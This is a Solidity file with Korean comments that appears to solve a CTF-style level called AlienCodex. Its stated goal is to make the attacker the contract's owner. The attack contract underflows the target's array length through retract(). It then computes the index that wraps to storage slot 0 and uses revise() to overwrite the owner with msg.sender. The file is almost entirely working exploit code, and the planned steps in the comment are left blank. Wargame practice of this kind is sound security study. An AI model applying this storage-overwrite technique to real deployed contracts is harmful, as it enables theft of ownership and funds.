// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

/* 목표
 * AlienCodex 컨트랙트의 Owner 주소를 공격자 주소로 변조하기
 * 
 * 공격 방식
 * 1. 
 * 2. 
 * 3. 
 * 4. 
 */

interface AlienCodex {
    function makeContact() external;
    function record(bytes32) external;
    function retract() external;
    function revise(uint256, bytes32) external;
}

contract Solve {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        unchecked {
            AlienCodex(target).makeContact();
            AlienCodex(target).retract();

            uint256 arraySlotStart = uint256(keccak256(abi.encode(1)));

            uint256 targetIndex = 0;

            targetIndex -= 1;               // 2 ** 256 - 1
            targetIndex -= arraySlotStart;  // 2 ** 256 - 1 - arraySlotStart
            targetIndex += 1;               // 2 ** 256 - arraySlotStart

            AlienCodex(target).revise(targetIndex, bytes32(uint256(uint160(msg.sender))));
        }
    }
}